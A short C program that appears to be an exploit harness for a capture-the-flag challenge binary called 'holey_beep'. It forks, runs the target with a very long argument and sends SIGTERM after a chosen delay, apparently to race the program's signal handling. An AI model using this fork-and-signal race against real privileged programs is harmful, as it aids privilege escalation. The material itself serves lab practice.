#include <signal.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

#define LEN 20000
int main(int argc, char* argv[])
{
    int sleep_time = atoi(argv[1]);
    printf("Trying...\n");
  
    int pid, err;
    if ((pid=fork()) == 0)
    {
        // Child should run holey_beep
        char str[LEN] = {0};
        for (err = 0; err < LEN - 1; err++) str[err] = '1';

        char* args[] = {"/home/user/holey_beep", str, NULL};
        execv("/home/user/holey_beep", args);
        printf("error child\n");
        return 0;
    }
    else 
    {
        // Parent should kill it
        usleep(sleep_time);
        kill(pid, SIGTERM);
    }        
    printf("Finished\n");
    return 0;
}